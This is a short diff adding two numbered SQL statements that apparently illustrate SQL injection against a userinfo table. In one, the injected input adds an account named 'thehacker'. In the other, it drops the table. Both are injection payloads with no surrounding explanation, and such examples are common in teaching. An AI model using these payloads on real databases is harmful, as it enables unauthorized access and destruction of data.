@@ -1,0 +1,5 @@
+# 1)
+SELECT Email FROM userinfo WHERE Username=''; INSERT INTO userinfo ('Username', 'Password', 'Email') VALUES ('thehacker', '2kvLXCR', 'ugot@hacked.com'); #'
+
+# 2)
+SELECT Email FROM userinfo WHERE Username=''; DROP TABLE userinfo; #' 
